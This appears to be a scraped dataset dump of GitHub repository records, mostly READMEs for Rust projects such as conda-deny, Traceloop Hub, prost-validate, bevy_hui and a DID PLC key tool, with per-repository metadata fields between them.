    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum States {
        Idle,
        Adding,
        Subtracting,
        Multiplying,
        Dividing
    }

    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum Events {
        Clear,
        Digit { digit: u8 },
        Add,
        Subtract,
        Multiply,
        Divide,
        Equals
    }

    impl Events {
        fn is_digit(&self) -> bool {
            if let Events::Digit { digit: _ } = self { true } else { false }
        }
    }

    let mut init_data = CalcData {
        input_value: AtomicF64::new(0f64),
        stored_value: AtomicF64::new(0f64)
    };

    let mut sm = StateMachineFactory::<Events, States, &CalcData>::new()
        // This is an example of a logger that runs before any other transition, but doesn't
        // do anything in terms of state transitions itself.
        .with_transition_effect(
            Any,
            Same,
            |d| {
                print!(""user sent {:?} event"", d.event);
                Ok(())
            })
        .with_predicated_transition_effect(
            Any,
            Same,
            |d| d.event.is_digit(),
            |d| {
                if let Events::Digit { digit } = d.event {
                    append_digit(d.data, digit.clone());
                }
                Ok(())
            })
        .with_predicated_transition_effect(
            AnyOf(vec![States::Adding, States::Subtracting, States::Multiplying, States::Dividing]),
            States::Idle,
            |d| {
                match d.event {
                    Events::Add | Events::Subtract | Events::Multiply | Events::Divide | Events::Equals => true,
                    _ => false
                }
            },
            |d| {
                apply_function(d);
                Ok(())
            })
        .with_event_transition_effect(&Events::Add, States::Idle, States::Adding, |d| {
            swap(d.data);
            Ok(())
        })
        .with_event_transition_effect(&Events::Subtract, States::Idle, States::Subtracting, |d| {
            swap(d.data);
            Ok(())
        })
        .with_event_transition_effect(&Events::Multiply, States::Idle, States::Multiplying, |d| {
            swap(d.data);
            Ok(())
        })
        .with_event_transition_effect(&Events::Divide, States::Idle, States::Dividing, |d| {
            swap(d.data);
            Ok(())
        })
        // This is an example of a logger that runs after any other transition, but doesn't
        // do anything in terms of state transitions itself. It continues the log lines from
        // the earlier logger
        .with_transition_effect(
            Any,
            Same,
            |d| {
                println!("", input value is {}, stored value is {}"", d.data.input_value.load(SeqCst), d.data.stored_value.load(SeqCst));
                Ok(())
            })
        .lock().build(States::Idle, &mut init_data);

    let error_mapper = |_| { anyhow!(""error transitioning"") };
    sm.handle_event(Events::Digit {digit: 2}).map_err(error_mapper)?;
    sm.handle_event(Events::Add).map_err(error_mapper)?;
    sm.handle_event(Events::Digit {digit: 0}).map_err(error_mapper)?;
    sm.handle_event(Events::Subtract).map_err(error_mapper)?;
    sm.handle_event(Events::Digit {digit: 1}).map_err(error_mapper)?;
    sm.handle_event(Events::Multiply).map_err(error_mapper)?;
    sm.handle_event(Events::Digit {digit: 1}).map_err(error_mapper)?;
    sm.handle_event(Events::Digit {digit: 2}).map_err(error_mapper)?;
    sm.handle_event(Events::Digit {digit: 6}).map_err(error_mapper)?;
    sm.handle_event(Events::Divide).map_err(error_mapper)?;
    sm.handle_event(Events::Digit {digit: 3}).map_err(error_mapper)?;
    sm.handle_event(Events::Equals).map_err(error_mapper)?;

    assert_eq!(42f64, sm.data.input_value.load(SeqCst));

    return Ok(());

    fn append_digit(d: &CalcData, b: u8) {
        let input_value_current = d.input_value.load(SeqCst);
        d.input_value.store(input_value_current * 10f64 + b as f64, SeqCst);
    }
    fn swap(d: &CalcData) {
        let old_input_value = d.input_value.load(SeqCst);
        d.stored_value.store(old_input_value, SeqCst);
        d.input_value.store(0f64, SeqCst);
    }
    fn apply_function(arg: StateTransitionEffectData<Events, States, &CalcData>) {
        let old_stored_value = arg.data.stored_value.load(SeqCst);
        let old_input_value = arg.data.input_value.load(SeqCst);
        match arg.from {
            States::Adding => {
                arg.data.input_value.store(old_stored_value + old_input_value, SeqCst);
            }
            States::Subtracting => {
                arg.data.input_value.store(old_stored_value - old_input_value, SeqCst);
            }
            States::Multiplying => {
                arg.data.input_value.store(old_stored_value * old_input_value, SeqCst);
            }
            States::Dividing => {
                arg.data.input_value.store(old_stored_value / old_input_value, SeqCst);
            }
            States::Idle => {}
        }
    }
}
````",0,0,1,,rust.yml,0.0
Quantco/conda-deny,main,"<picture>
  <source media=""(prefers-color-scheme: dark)"" srcset=""./.github/assets/conda-deny-banner-dark.png"">
  <source media=""(prefers-color-scheme: light)"" srcset=""./.github/assets/conda-deny-banner-light.png"">
  <img alt=""conda-deny"" src=""./.github/assets/conda-deny-banner-light.png"">
</picture>

<div align=""center"">

[![License][license-badge]](LICENSE)
[![CI Status][ci-badge]][ci]
[![Binary Build][binary-build-badge]][binary-build]
[![Conda Platform][conda-badge]][conda-url]
[![Codecov][codecov]][codecov-url]

[license-badge]: https://img.shields.io/github/license/quantco/conda-deny?style=flat-square

[ci-badge]: https://img.shields.io/github/actions/workflow/status/quantco/conda-deny/ci.yml?branch=main&style=flat-square&label=CI
[ci]: https://github.com/quantco/conda-deny/actions/workflows/ci.yml

[binary-build-badge]: https://img.shields.io/github/actions/workflow/status/quantco/conda-deny/build.yml?branch=main&style=flat-square&label=Binary%20Build
[binary-build]: https://github.com/quantco/conda-deny/actions/workflows/build.yml

[conda-badge]: https://img.shields.io/conda/vn/conda-forge/conda-deny?style=flat-square
[conda-url]: https://prefix.dev/channels/conda-forge/packages/conda-deny

[codecov]: https://img.shields.io/codecov/c/github/quantco/conda-deny/main?style=flat-square
[codecov-url]: https://codecov.io/gh/Quantco/conda-deny

</div>

## üóÇ Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Usage](#-usage)

## üìñ Introduction

conda-deny is a CLI tool for checking software environment dependencies for license compliance.
Compliance is checked with regard to a whitelist of licenses provided by the user. 

## üíø Installation

You can install `conda-deny` using `pixi`:

```bash
pixi global install conda-deny
```

Or by downloading our pre-built binaries from the [releases page](https://github.com/quantco/conda-deny/releases).

## üéØ Usage

![conda-deny demo](.github/assets/demo/demo-light.gif#gh-light-mode-only)
![conda-deny demo](.github/assets/demo/demo-dark.gif#gh-dark-mode-only)

`conda-deny` can be configured in your `pixi.toml` or `pyproject.toml` (`pixi.toml` is preferred).
The tool expects a configuration in the following format:

```toml
[tool.conda-deny]
#--------------------------------------------------------
# General setup options:
#--------------------------------------------------------
license-whitelist = ""https://raw.githubusercontent.com/QuantCo/conda-deny/main/tests/test_remote_base_configs/conda-deny-license_whitelist.toml"" # or [""license_whitelist.toml"", ""other_license_whitelist.toml""]
platform = ""linux-64"" # or [""linux-64"", ""osx-arm64""]
environment = ""default"" # or [""default"", ""py39"", ""py310"", ""prod""]
lockfile = ""environment/pixi.lock"" # or [""environment1/pixi.lock"", ""environment2/pixi.lock""]

#--------------------------------------------------------
# License whitelist directly in configuration file:
#--------------------------------------------------------
safe-licenses = [""MIT"", ""BSD-3-Clause""]
ignore-packages = [
    { package = ""make"", version = ""0.1.0"" },
]
```

After installing `conda-deny`, you can run `conda-deny check` in your project.
This then checks `pixi.lock` to determine the packages (and their versions) used in your project.
",3,5,4,BSD-3-Clause,"build.yml,ci.yml,coverage.yml",6.0
Schachte/space-monitor-rs,master,"# üöÄ Space Monitor

![Spaces Demo](./assets/pic.png)

Space Monitor is a Rust API for subscribing to real-time changes on Mac OS X to obtain the current active [space](https://support.apple.com/guide/mac-help/work-in-multiple-spaces-mh14112/mac) (virtual desktop) index.

Heavily inspired by the great work of [George Christou](https://github.com/gechr) and his Swift project - [WhichSpace](https://github.com/gechr/WhichSpace).

## üìö Examples

Check usage in the [examples](./examples/) directory

### Async retrieval (event listener)

```rust
use std::thread;

use macos_space_monitor::{MonitorEvent, SpaceMonitor};

fn main() {
    let (monitor, rx) = SpaceMonitor::new();
    let _monitoring_thread = thread::spawn(move || {
        while let Ok(event) = rx.recv() {
            match event {
                MonitorEvent::SpaceChange(space) => {
                    println!(""Space change detected! Active space is: {}"", space);
                }
            }
        }
    });

    monitor.start_listening();
}
```

### Sync retrieval

```rust
use macos_space_monitor::SpaceMonitor;

fn main() {
    let space = SpaceMonitor::get_current_space_number();
    println!(""Current space: {}"", space);
}
```

## Why?

This library was motivated by a fun project I am working on that deals with managing spaces in a more custom way on Mac OS X for more efficient space navigation. One of the core requirements when building space/window management tooling is to understand _where_ you are within your display. This is a key crate I rely on to enable real-time lookups to map a virtual display ID to a space index.

## Building

If you don't know Rust or aren't using Rust and simply just want a binary you can invoke from your own code, you can build the example directly and embed the binary or add it to your `$PATH`.

- Event Listener Version:

  - Build: `cargo build --release --example monitor`
  - Run: `./target/release/examples/monitor`

- Adhoc Version:
  - Build: `cargo build --release --example adhoc`
  - Run: `./target/release/examples/adhoc`

## üß† How it works

Surprisingly, obtaining the active virtual desktop index is a non-trivial task on Mac OS X and attempts in doing so have been breaking release after release as the method relies on undocumented Mac OS native APIs.

This method relies on a few key ingredients:

- Core Graphics (CG)

  - We use `CGSMainConnectionID` to get a connection to the main window server
  - The CGS (core graphics services) API is exploited to obtain this information

- FFI (Foreign function interface)

  - Bridge for us to call the C APIs from Rust

- Cocoa

  - Apple's native API for Mac OS apps
  - `NSApplication` for background app
  - Handle system notifications

- Objective-C
  - Some message-passing invocations (`msg_send!`)
  - Used for receiving event notifications

Space monitor is essentially a Rust binding to access lower-level mac OS internal APIs in an easy and efficient way.

While you can occassionally deciper some esoteric plist files to derive the active screen via `defaults read com.apple.spaces SpacesDisplayConfiguration`, the contents are almost always incorrect and out of date, which makes it a non-starter for realtime change detection.

## üê¶ Swift

When I designed this crate, I wanted a minimal example I could iterate off of in Swift to simplify the migration into Rust since I'm not a Swift developer. Mostly just committing this for posterity, but you can find a much simpler implementation of this lib in Swift underneath the [./swift](./swift) directory. Once again, this is heavily inspired by [WhichSpace](https://github.com/gechr/WhichSpace), but wanted to remove all the boilerplate.

You can compile it via either of the following:

- [./swift/compile.sh](./swift/compile.sh)
- `swiftc -o SpaceMonitor CurrentSpace-types.swift CurrentSpace-main.swift CurrentSpace-delegate.swift`

Then just run:

- `./SpaceMonitor`

## ‚ö†Ô∏è Warning

As this crate relies on private, undocumented native Mac OS APIs internally, I _believe_ your app would be rejected from the Apple app store if this crate is used within your application. However, users can still install the application externally.
",0,0,1,,,0.0
linka-cloud/prost-validate,main,"![MSRV](https://img.shields.io/badge/rustc-1.74+-blue.svg)
[![Continuous integration](https://github.com/linka-cloud/prost-validate/actions/workflows/ci_derive.yml/badge.svg)](https://github.com/linka-cloud/prost-validate/actions/workflows/ci_derive.yml)
![Apache 2.0](https://img.shields.io/badge/license-Apache2.0-blue.svg)

# Prost Validate

This is a Rust implementation of [protoc-gen-validate](https://github.com/bufbuild/protoc-gen-validate).

It must be used with [prost](https://github.com/tokio-rs/prost) generated code.

All validation rules are documented in the [proto file](../prost-validate-types/proto/validate/validate.proto)
or in the [protoc-gen-validate](https://github.com/bufbuild/protoc-gen-validate/blob/v1.1.0/README.md#constraint-rules)
documentation.

It provides two implementations:

- A derive based implementation in the [prost-validate](prost-validate/README.md) crate.
- A reflection based implementation in the [prost-reflect-validate](prost-reflect-validate/README.md) crate.

The [test suite](prost-validate-tests) adapted from
the [protoc-gen-validate harness tests](https://github.com/bufbuild/protoc-gen-validate/blob/v1.1.0/tests/harness/executor/cases.go)
is shared between the two implementations.

Here are the benchmarks for the tests suite of the two implementations:

`prost-reflect-validate`:

```
harness reflect         time:   [14.849 ms 15.128 ms 15.459 ms]
```

`prost-validate`:

```
harness derive          time:   [2.5635 ms 2.5780 ms 2.5967 ms]
```

### Constraint Rule Comparison

#### Global

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| disabled        |   ‚úÖ    |    ‚úÖ    |

#### Numerics

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| const           |   ‚úÖ    |    ‚úÖ    |
| lt/lte/gt/gte   |   ‚úÖ    |    ‚úÖ    |
| in/not_in       |   ‚úÖ    |    ‚úÖ    |

#### Bools

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| const           |   ‚úÖ    |    ‚úÖ    |

#### Strings

| Constraint Rule        | Derive | Reflect |
|------------------------|:------:|:-------:|
| const                  |   ‚úÖ    |    ‚úÖ    |
| len/min\_len/max_len   |   ‚úÖ    |    ‚úÖ    |
| min\_bytes/max\_bytes  |   ‚úÖ    |    ‚úÖ    |
| pattern                |   ‚úÖ    |    ‚úÖ    |
| prefix/suffix/contains |   ‚úÖ    |    ‚úÖ    |
| contains/not_contains  |   ‚úÖ    |    ‚úÖ    |
| in/not_in              |   ‚úÖ    |    ‚úÖ    |
| email                  |   ‚úÖ    |    ‚úÖ    |
| hostname               |   ‚úÖ    |    ‚úÖ    |
| address                |   ‚úÖ    |    ‚úÖ    |
| ip                     |   ‚úÖ    |    ‚úÖ    |
| ipv4                   |   ‚úÖ    |    ‚úÖ    |
| ipv6                   |   ‚úÖ    |    ‚úÖ    |
| uri                    |   ‚úÖ    |    ‚úÖ    |
| uri_ref                |   ‚úÖ    |    ‚úÖ    |
| uuid                   |   ‚úÖ    |    ‚úÖ    |
| well_known_regex       |   ‚úÖ    |    ‚úÖ    |

#### Bytes

| Constraint Rule        | Derive | Reflect |
|------------------------|:------:|:-------:|
| const                  |   ‚úÖ    |    ‚úÖ    |
| len/min\_len/max_len   |   ‚úÖ    |    ‚úÖ    |
| pattern                |   ‚úÖ    |    ‚úÖ    |
| prefix/suffix/contains |   ‚úÖ    |    ‚úÖ    |
| in/not_in              |   ‚úÖ    |    ‚úÖ    |
| ip                     |   ‚úÖ    |    ‚úÖ    |
| ipv4                   |   ‚úÖ    |    ‚úÖ    |
| ipv6                   |   ‚úÖ    |    ‚úÖ    |

#### Enums

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| const           |   ‚úÖ    |    ‚úÖ    |
| defined_only    |   ‚úÖ    |    ‚úÖ    |
| in/not_in       |   ‚úÖ    |    ‚úÖ    |

#### Messages

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| skip            |   ‚úÖ    |    ‚úÖ    |
| required        |   ‚úÖ    |    ‚úÖ    |

#### Repeated

| Constraint Rule      | Derive | Reflect |
|----------------------|:------:|:-------:|
| min\_items/max_items |   ‚úÖ    |    ‚úÖ    |
| unique               |   ‚úÖ    |    ‚úÖ    |
| items                |   ‚úÖ    |    ‚úÖ    |

#### Maps

| Constraint Rule      | Derive | Reflect |
|----------------------|:------:|:-------:|
| min\_pairs/max_pairs |   ‚úÖ    |    ‚úÖ    |
| no_sparse            |   ‚ùì    |    ‚ùì    |
| keys                 |   ‚úÖ    |    ‚úÖ    |
| values               |   ‚úÖ    |    ‚úÖ    |

#### OneOf

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| required        |   ‚úÖ    |    ‚úÖ    |

#### WKT Scalar Value Wrappers

| Constraint Rule    | Derive | Reflect |
|--------------------|:------:|:-------:|
| wrapper validation |   ‚úÖ    |    ‚úÖ    |

#### WKT Any

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| required        |   ‚úÖ    |    ‚úÖ    |
| in/not_in       |   ‚úÖ    |    ‚úÖ    |

#### WKT Duration

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| required        |   ‚úÖ    |    ‚úÖ    |
| const           |   ‚úÖ    |    ‚úÖ    |
| lt/lte/gt/gte   |   ‚úÖ    |    ‚úÖ    |
| in/not_in       |   ‚úÖ    |    ‚úÖ    |

#### WKT Timestamp

| Constraint Rule | Derive | Reflect |
|-----------------|:------:|:-------:|
| required        |   ‚úÖ    |    ‚úÖ    |
| const           |   ‚úÖ    |    ‚úÖ    |
| lt/lte/gt/gte   |   ‚úÖ    |    ‚úÖ    |
| lt_now/gt_now   |   ‚úÖ    |    ‚úÖ    |
| within          |   ‚úÖ    |    ‚úÖ    |
",0,2,2,Apache-2.0,"ci_derive.yml,ci_reflect.yml",4.0
traceloop/hub,main,"<h1 align=""center"">
Traceloop Hub
</h1>
<p align=""center"">
  <p align=""center"">Open-source, high-performance LLM gateway written in Rust. Connect to any LLM provider with a single API. Observability Included.</p>
</p>
<h4 align=""center"">
    <a href=""https://traceloop.com/docs/hub/getting-started""><strong>Get started ¬ª</strong></a>
    <br />
    <br />
  <a href=""https://traceloop.com/slack"">Slack</a> |
  <a href=""https://traceloop.com/docs/hub"">Docs</a>
</h4>

<h4 align=""center"">
  <a href=""https://github.com/traceloop/hub/releases"">
    <img src=""https://img.shields.io/github/release/traceloop/hub"">
  </a>
   <a href=""https://github.com/traceloop/hub/blob/main/LICENSE"">
    <img src=""https://img.shields.io/badge/license-Apache 2.0-blue.svg"" alt=""Traceloop Hub is released under the Apache-2.0 License"">
  </a>
  <a href=""https://github.com/traceloop/hub/actions/workflows/ci.yml"">
  <img src=""https://github.com/traceloop/hub/actions/workflows/ci.yml/badge.svg"">
  </a>
  <a href=""https://github.com/traceloop/hub/issues"">
    <img src=""https://img.shields.io/github/commit-activity/m/traceloop/hub"" alt=""git commit activity"" />
  </a>
  <a href=""https://www.ycombinator.com/companies/traceloop""><img src=""https://img.shields.io/website?color=%23f26522&down_message=Y%20Combinator&label=Backed&logo=ycombinator&style=flat-square&up_message=Y%20Combinator&url=https%3A%2F%2Fwww.ycombinator.com""></a>
  <a href=""https://github.com/traceloop/hub/blob/main/CONTRIBUTING.md"">
    <img src=""https://img.shields.io/badge/PRs-Welcome-brightgreen"" alt=""PRs welcome!"" />
  </a>
  <a href=""https://traceloop.com/slack"">
    <img src=""https://img.shields.io/badge/chat-on%20Slack-blueviolet"" alt=""Slack community channel"" />
  </a>
  <a href=""https://twitter.com/traceloopdev"">
    <img src=""https://img.shields.io/badge/follow-%40traceloopdev-1DA1F2?logo=twitter&style=social"" alt=""Traceloop Twitter"" />
  </a>
</h4>

Hub is a next generation smart proxy for LLM applications. It centralizes control and tracing of all LLM calls and traces.
It's built in Rust so it's fast and efficient. It's completely open-source and free to use.

Built and maintained by Traceloop under the Apache 2.0 license.

## üöÄ Getting Started

Make sure to copy a `config.yaml` file from `config-example.yaml` and set the correct values, following the [configuration](https://www.traceloop.com/docs/hub/configuration) instructions.

You can then run the hub locally by running `cargo run` in the root directory, or using the docker image:

```
docker run --rm -p 3000:3000 -v $(pwd)/config.yaml:/usr/local/bin/config.yaml:ro -t traceloop/hub
```

Connect to the hub by using the OpenAI SDK on any language, and setting the base URL to:
```
http://localhost:3000/api/v1
```

For example, in Python:
```
client = OpenAI(
    base_url=""http://localhost:3000/api/v1"",
    api_key=os.getenv(""OPENAI_API_KEY""),
    # default_headers={""x-traceloop-pipeline"": ""azure-only""},
)
completion = client.chat.completions.create(
    model=""claude-3-5-sonnet-20241022"",
    messages=[{""role"": ""user"", ""content"": ""Tell me a joke about opentelemetry""}],
    max_tokens=1000,
)
```

## üå± Contributing

Whether big or small, we love contributions ‚ù§Ô∏è Check out our guide to see how to [get started](https://traceloop.com/docs/hub/contributing/overview).

Not sure where to get started? You can:

- [Book a free pairing session with one of our teammates](mailto:nir@traceloop.com?subject=Pairing%20session&body=I'd%20like%20to%20do%20a%20pairing%20session!)!
- Join our <a href=""https://traceloop.com/slack"">Slack</a>, and ask us any questions there.

## üíö Community & Support

- [Slack](https://traceloop.com/slack) (For live discussion with the community and the Traceloop team)
- [GitHub Discussions](https://github.com/traceloop/hub/discussions) (For help with building and deeper conversations about features)
- [GitHub Issues](https://github.com/traceloop/hub/issues) (For any bugs and errors you encounter using OpenLLMetry)
- [Twitter](https://twitter.com/traceloopdev) (Get news fast)
",2,0,7,Apache-2.0,"ci.yml,docker.yml,release.yml",13.0
Lommix/solis_2d,master,"# Solis 2D

[![License: MIT or Apache 2.0](https://img.shields.io/badge/License-MIT%20or%20Apache2-blue.svg)](./LICENSE)
[![Crate](https://img.shields.io/crates/v/solis_2d.svg)](https://crates.io/crates/solis_2d)

### 2D global illumination with radiance cascades.

![title img](docs/screen.png)

Featuring realistic 2D light, shadow and normal map calculation using
a optimized version of radiance cascade.

This crate is currently work in progress.

Aiming to be compatible with all targets.

### Checkout out the examples

```bash
cargo run --example light --features=dev
cargo run --example simple --features=dev
```

### How to use

Add the `SolisPlugin`.

```rust
app.add_plugins(SolisPlugin::default());
```

Create a special Camera2D with `hdr:true`.

```rust
RadianceCameraBundle {
    camera_bundle: Camera2dBundle {
        camera: Camera {
            hdr: true,
            ..default()
        },
        ..default()
    },
    radiance_cfg: RadianceConfig{..} // quality, perfomance & effects
    ..default()
}
```

Add `Emitter` Components to your entities. A Emitter can emit light
and be also an occluder at the same time. Any Emitter with a zero color (black)
or 0. Intensity just acts like an occluder.
Intensity below `0.` acts as a negative emitter and subtracts light from
the scene.

```rust
cmd.spawn((
    SpriteBundle {
        texture: server.load(""box.png""),
        transform: Transform::from_xyz((x as f32) * 400., (y as f32) * 400., 1.),
        ..default()
    },
    Emitter {
        intensity: 0.0,
        color: Color::BLACK,
        shape: SdfShape::Rect(Vec2::new(50., 25.)),
    },
));

```

### Normal Maps

Normal maps are currently very experimental. For normals to work,
you need to provide a texture with the scenes normals. This is done
by syncing a second sprite with the normal on another render layer with
a second camera. (checkout the light example)

```rust
// you have to resize the image, each time the window resizes
let image_handle = images.add(create_image(Vec2::new(1024., 1024.)));

// add this component to the radiance camera
cmd.spawn((
    RadianceCameraBundle { .. },
    NormalTarget(image_handle.clone()),
));

// spawn the normal camera
cmd.spawn((
    Camera2dBundle {
        camera: Camera {
            target: RenderTarget::Image(image_handle),
            ..default()
        },
        ..default()
    },
    RenderLayers::layer(3), // any layer > 0 will do
));

// spawn a normal map sprite
cmd.spawn((
    SpriteBundle {
        texture: server.load(""boxn.png""),
        ..default()
    },
    RenderLayers::layer(3),
    Spin(rand),
));
```

https://github.com/user-attachments/assets/858d7842-aed2-46b7-b001-7b87aa3e8ac0

https://github.com/user-attachments/assets/5c98a8c4-ae5b-4019-b147-ceba065f074b

# Amazing resources:

[Gm Shader Blog](https://mini.gmshaders.com/p/radiance-cascades2)

[Json's RC Blog](https://jason.today/rc)
",0,2,1,Apache-2.0,,1.0
dimforge/wgmath,main,"# wgmath ‚àí GPU scientific computing on every platform

<p align=""center"">
  <img src=""https://wgmath.rs/img/wgmath_logo_w_padding.svg"" alt=""crates.io"" height=""200px"">
</p>
<p align=""center"">
    <a href=""https://discord.gg/vt9DJSW"">
        <img src=""https://img.shields.io/discord/507548572338880513.svg?logo=discord&colorB=7289DA"">
    </a>
</p>

-----

**wgmath** is a set of [Rust](https://www.rust-lang.org/) libraries exposing re-usable GPU shaders for scientific
computing including:

- Linear algebra with the **wgebra** crate.
- AI (Large Language Models) with the **wgml** crate.
- Collision-detection with the **wgparry2d** and **wgparry3d** crates (still very WIP).
- Rigid-body physics with the **wgrapier2d** and **wgrapier3d** crates( (still very WIP).
- Non-rigid physics with the **.
  By targeting WebGPU, these libraries run on most GPUs, including on mobile and on the web. It aims to promote open and
  cross-platform GPU computing for scientific applications, a field currently strongly dominated by proprietary
  solutions (like CUDA).

All of the libraries are still under heavy development and might be lacking some important features. Contributions are
welcome!

In particular, the **wgcore** crate part of the **wgmath** ecosystem exposes a set of proc-macros to facilitate sharing
and composing shaders across Rust libraries.

See the readme of each individual crate (on the `crates` directory) for additional details.
",0,0,1,Apache-2.0,,1.0
element-hq/matrix-authentication-service,main,"# OAuth2.0 + OpenID Connect Provider for Matrix Homeservers

MAS (Matrix Authentication Service) is an OAuth 2.0 and OpenID Provider server for Matrix.

It has been created to support the migration of Matrix to an OpenID Connect (OIDC) based authentication layer as per [MSC3861](https://github.com/matrix-org/matrix-doc/pull/3861).

See the [Documentation](https://element-hq.github.io/matrix-authentication-service/index.html) for information on installation and use.

You can learn more about Matrix and OIDC at [areweoidcyet.com](https://areweoidcyet.com/).

![Delegated OIDC architecture with MAS overview](overview.png)

## Features

- Supported homeservers
  - ‚úÖ Synapse
- Authentication methods:
  - ‚úÖ Upstream OIDC
  - üöß Local password
  - ‚ÄºÔ∏è [Application Services login](https://element-hq.github.io/matrix-authentication-service/as-login.html) (**Encrypted bridges**)
- Migration support
  - ‚úÖ Compatibility layer for legacy Matrix authentication
  - ‚úÖ Advisor on migration readiness
  - ‚úÖ Import users from Synapse
  - ‚úÖ Import password hashes from Synapse
  - ‚úÖ Import of external subject IDs for upstream identity providers from Synapse

## Upstream Identity Providers

MAS is known to work with the following upstream IdPs via OIDC:

- [Keycloak](https://www.keycloak.org/)
- [Dex](https://dexidp.io/)
- [Google](https://developers.google.com/identity/openid-connect/openid-connect)
",1,109,19,AGPL-3.0,"build.yaml,ci.yaml,coverage.yaml,docs.yaml,release.yaml,translations-download.yaml,translations-upload.yaml",55.0
str4d/plc,main,"# plc: Key management for DID PLC identities

`plc` is a tool for managing DID PLC identities. The end goal is to enable users
to add and manage YubiKeys as backup rotation keys.

The tool is currently a work-in-progress and may change incompatibly at any time.

The DID PLC specification is at [web.plc.directory](https://web.plc.directory/spec/v0.1/did-plc).

## Installation

| Environment | CLI command |
|-------------|-------------|
| Cargo (Rust 1.65+) | `cargo install --git https://github.com/str4d/plc` |

## Usage

### Key management

Currently only key inspection is implemented:

```
$ plc keys list bsky.app
Not currently authenticated to bsky.app; can't fetch PDS keys

Account did:plc:z72i7hdynmk6r22z27h6tvur
- Primary handle: @bsky.app
- PDS: https://puffball.us-east.host.bsky.network
- Signing key: Unknown (Secp256k1): 043249d921a1da482dc7117e9451bf2ae48ef641dc87bd9c9ea3648f3e81cce2494474cc0a80053c9be012d049a80b0ededd4064670024a8ce8a1b5e25a5655b52
- 2 rotation keys:
  - [0] Unknown (Secp256k1): 0425f4891e63128b8ab689e862b8e11428f24095e3e57b9ea987eb70d1b59af9dfe8113ffd3dcdd3e15ac5415b6282ec12b627d06c7cdead1e3ec1887680948243
  - [1] Unknown (Secp256k1): 048fe3769f5055088b448ca064bcecd7b6844239c355c98d4556d5c9c8c522de784fdc4cd480dc7b99d505243ec026409569a69842dbae649940cf7e8496efa31d
```

### DID inspection

You can list the currently-active operations for a DID:

```
$ plc ops list bsky.app
Account did:plc:z72i7hdynmk6r22z27h6tvur

Initial state:
- Rotation keys:
  - [0] did:key:zQ3shhCGUqDKjStzuDxPkTxN6ujddP4RkEKJJouJGRRkaLGbg
  - [1] did:key:zQ3shpKnbdPx3g3CmPf5cRVTPe1HtSwVn5ish3wSnDPQCbLJK
- Verification methods:
  - atproto: did:key:zQ3shXjHeiBuRCKmM36cuYnm7YEMzhGnCmCyW92sRJ9pribSF
- Also-known-as:
  - [0] at://bluesky-team.bsky.social
- Services:
  - atproto_pds: AtprotoPersonalDataServer = https://bsky.social

Update 1:
- Changed Also-known-as[0] to at://bsky.app

Update 2:

Update 3:
- Changed verification method atproto to did:key:zQ3shQo6TF2moaqMTrUZEM1jeuYRQXeHEx4evX9751y2qPqRA
- Changed service atproto_pds endpoint to https://puffball.us-east.host.bsky.network

Current state:
- Rotation keys:
  - [0] did:key:zQ3shhCGUqDKjStzuDxPkTxN6ujddP4RkEKJJouJGRRkaLGbg
  - [1] did:key:zQ3shpKnbdPx3g3CmPf5cRVTPe1HtSwVn5ish3wSnDPQCbLJK
- Verification methods:
  - atproto: did:key:zQ3shQo6TF2moaqMTrUZEM1jeuYRQXeHEx4evX9751y2qPqRA
- Also-known-as:
  - [0] at://bsky.app
- Services:
  - atproto_pds: AtprotoPersonalDataServer = https://puffball.us-east.host.bsky.network
```

`plc` can also validate the audit log provided by [plc.directory](https://plc.directory):

```
$ plc ops audit bsky.app
Audit log for bsky.app is valid!
```

## License

Licensed under either of

 * Apache License, Version 2.0, ([LICENSE-APACHE](LICENSE-APACHE) or
   http://www.apache.org/licenses/LICENSE-2.0)
 * MIT license ([LICENSE-MIT](LICENSE-MIT) or http://opensource.org/licenses/MIT)

at your option.

### Contribution

Unless you explicitly state otherwise, any contribution intentionally
submitted for inclusion in the work by you, as defined in the Apache-2.0
license, shall be dual licensed as above, without any additional terms or
conditions.
",0,0,2,Apache-2.0,ci.yml,5.0
Lommix/bevy_hui,master,"# Bevy_hui

[![License: MIT or Apache 2.0](https://img.shields.io/badge/License-MIT%20or%20Apache2-blue.svg)](./LICENSE)
[![Crate](https://img.shields.io/crates/v/bevy_hui.svg)](https://crates.io/crates/bevy_hui)

Build `bevy_ui` design in pseudo Html. Keep your logic in bevy, while iterating fast on design
with hot reloading. Create reusable templates in the style of Web Components.

**starting with bevy 0.15!**

https://github.com/user-attachments/assets/4eb22305-7762-404e-9093-806b6a155ede

## Features

-   In build support for conditional styles and transitions. Hover animations by default!
-   Any value can be a dynamic property and injected into a template at runtime. (recursive!)
-   Simple but effective event system. Register any bevy system via function binding and use it
    in your templates `on_press=""start_game""`.
-   No widgets, no themes. Just bevy UI serialized with all the tools necessary to build anything
    in a reusable manor.

## Example

Like most crates, don't forget to register the plugin!

```rust
app.add_plugins((
    HuiPlugin,
    // Optional auto loading. Any template this folder will register as custom component
    // using the file name.
    HuiAutoLoadPlugin::new(&[""components""]),
));

```

## Getting Started ([Bevy html syntax Cheatsheet](docs/cheatsheet.md))

Create your first component template with external properties!

```html
<!-- /assets/my_button.html-->
<template>
    <property name=""action"">greet</property>
    <property name=""text"">Press me</property>
    <property name=""primary"">#123</property>
    <property name=""secondary"">#503</property>

    <node padding=""10px"">
        <button
            id=""button""
            padding=""5px""
            background=""{primary}""
            border_color=""{primary}""
            delay=""0.2s""
            ease=""cubic_in""
            height=""80px""
            width=""210px""
            border=""10px""
            border_radius=""30px""
            hover:height=""100px""
            hover:background=""{secondary}""
            hover:border_color=""{secondary}""
            hover:width=""230px""
            on_press=""{action}""
        >
            <text
                watch=""button""
                font_size=""20""
                font_color=""#FFF""
                hover:font_color=""#752""
            >
                {text}
            </text>
        </button>
    </node>
</template>
```

## Register your component and make a custom binding

To use your new component in any other templates, we have to register it first.
You can either use the `HuiAutoLoadPlugin` feature (experimental), which
is great for simple components or register the component yourself in a startup system.

This also allows for custom spawning functions. With is great if you need to add custom components as well!

```rust
fn startup(
    server: Res<AssetServer>,
